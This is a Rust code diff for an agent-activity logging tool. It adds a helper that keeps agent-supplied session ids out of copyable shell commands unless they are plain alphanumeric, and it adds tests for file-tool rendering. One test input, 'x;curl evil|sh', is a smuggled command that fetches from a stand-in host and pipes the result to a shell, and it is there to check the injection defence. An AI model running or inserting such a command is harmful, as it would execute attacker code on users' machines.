@@ -31,7 +31,7 @@ use serde_json::Value;
 use crate::hook::HookEvent;
 use crate::init::{printable, say};
 use crate::log::{
-    ELLIPSIS, NOTHING_RECORDED, action, cut_end, find, find_session, local_time, plural,
+    ELLIPSIS, NOTHING_RECORDED, action, cut_end, cut_start, find, find_session, local_time, plural,
     relative_path, short_id, short_id_chars, takes_snapshot,
 };
 use crate::repo::{self, YalperDir};
@@ -320,23 +320,34 @@ fn file_tool_path(event: &Event) -> Option<&str> {
 /// failed, and the command that shows its full input and output.
 fn write_file_tool(out: &mut dyn Write, view: &StepView<'_>, path: &str, full: bool) {
     let event = view.event;
-    let path = cut_end(
-        &printable(&relative_path(path, view.roots)),
-        MAX_LINE_CHARS,
-        false,
-    );
+    let path = cut_start(&printable(&relative_path(path, view.roots)), MAX_LINE_CHARS);
     let label = format!("{} {path}", field(&action(event)));
     say(out, &printable(&tool_line(event, label)));
-    say(
-        out,
-        &printable(&format!(
-            "`yalper show {} --session {}` shows its full input and output.",
-            event.step, view.session
-        )),
-    );
+    let step = event.step.to_string();
+    let command = show_command(&step, Some(view.session), "shows its full input and output");
+    say(out, &printable(&command));
     if event.success == Some(false) {
         let error = event.payload.get("error").and_then(Value::as_str);
         text_block(out, "Error", error, full);
+    }
+}
+
+/// The sentence `` `yalper show <step> --session <id>` <what>. ``, a command to copy. The session's short id is
+/// in it only when it is made of ASCII letters, digits and `-`, and was not cut: session ids come from the agent,
+/// so one could hold text a shell would run. Otherwise, or without `session`, the command says `<session>` and
+/// where to find the id.
+pub(crate) fn show_command(step: &str, session: Option<&str>, what: &str) -> String {
+    let copyable = session.filter(|id| {
+        !id.is_empty()
+            && id
+                .chars()
+                .all(|char| char.is_ascii_alphanumeric() || char == '-')
+    });
+    match copyable {
+        Some(id) => format!("`yalper show {step} --session {id}` {what}."),
+        None => format!(
+            "`yalper show {step} --session <session>` {what}; `yalper log --all` lists the sessions."
+        ),
     }
 }
 
@@ -1304,10 +1315,10 @@ mod tests {
                 "tool_response": {"stdout": "done", "stderr": ""}}),
         );
         let roots = ["/p".to_owned()];
-        let render = |event: &Event, file_tools_by_path: bool| {
+        let render = |event: &Event, file_tools_by_path: bool, session: &str| {
             let view = StepView {
                 event,
-                session: "s1",
+                session,
                 steps: 20,
                 prompt: None,
                 roots: &roots,
@@ -1328,7 +1339,7 @@ mod tests {
         };
         let hint = "`yalper show 12 --session s1` shows its full input and output.\n";
 
-        let shown = render(&edit, true);
+        let shown = render(&edit, true, "s1");
         assert!(
             shown.contains(&format!(
                 "\nEdit src/a.js, succeeded in 30 ms\n{hint}\n1 file changed:"
@@ -1339,7 +1350,7 @@ mod tests {
         for left_out in ["Input:", "Output:", "old_string", "userModified"] {
             assert!(!shown.contains(left_out), "{shown}");
         }
-        let shown = render(&failed, true);
+        let shown = render(&failed, true, "s1");
         assert!(
             shown.contains(&format!(
                 "\nEdit src/a.js, FAILED after 5 ms\n{hint}\nError:\n  String not found\n"
@@ -1348,18 +1359,62 @@ mod tests {
         );
         assert!(!shown.contains("Input:"), "{shown}");
         // Other tools, and file tools without the option, keep their input and output.
-        let shown = render(&bash, true);
+        let shown = render(&bash, true, "s1");
         assert!(
             shown.contains("Command:\n  sed -i s/old/new/ src/a.js\n\nOutput:\n  done\n"),
             "{shown}"
         );
         assert!(!shown.contains("yalper show"), "{shown}");
-        let shown = render(&edit, false);
+        let shown = render(&edit, false, "s1");
         assert!(
             shown.contains("\nEdit, succeeded in 30 ms\n\nInput:\n"),
             "{shown}"
         );
         assert!(shown.contains("\"userModified\": false"), "{shown}");
         assert!(!shown.contains("yalper show"), "{shown}");
+
+        // Every file tool is found by the input key that names its file.
+        let write = tool(
+            "Write",
+            true,
+            serde_json::json!({"tool_input": {"file_path": "/p/src/a.js", "content": "new\n"},
+                "duration_ms": 3}),
+        );
+        let notebook = tool(
+            "NotebookEdit",
+            true,
+            serde_json::json!({"tool_input": {"notebook_path": "/p/src/a.js", "new_source": "new"},
+                "duration_ms": 7}),
+        );
+        for (event, line) in [
+            (&write, "\nWrite src/a.js, succeeded in 3 ms\n"),
+            (&notebook, "\nNotebookEdit src/a.js, succeeded in 7 ms\n"),
+        ] {
+            let shown = render(event, true, "s1");
+            assert!(shown.contains(&format!("{line}{hint}")), "{shown}");
+            assert!(!shown.contains("Input:"), "{shown}");
+        }
+
+        // A long path keeps its file name.
+        let deep = format!("/p/{}a.js", "folder/".repeat(40));
+        let long = tool(
+            "Edit",
+            true,
+            serde_json::json!({"tool_input": {"file_path": deep}, "duration_ms": 30}),
+        );
+        let shown = render(&long, true, "s1");
+        assert!(
+            shown.contains("\nEdit ...") && shown.contains("folder/a.js, succeeded in 30 ms\n"),
+            "{shown}"
+        );
+
+        // A session id that a shell could run, or that was cut, is not put in the command to copy.
+        let placeholder = "`yalper show 12 --session <session>` shows its full input and output; `yalper log \
+                           --all` lists the sessions.\n";
+        for session in ["x;curl evil|sh", "5f3c2a1e...", "a b", ""] {
+            let shown = render(&edit, true, session);
+            assert!(shown.contains(placeholder), "{shown}");
+            assert!(!shown.contains(&format!("--session {session}`")), "{shown}");
+        }
     }
 }
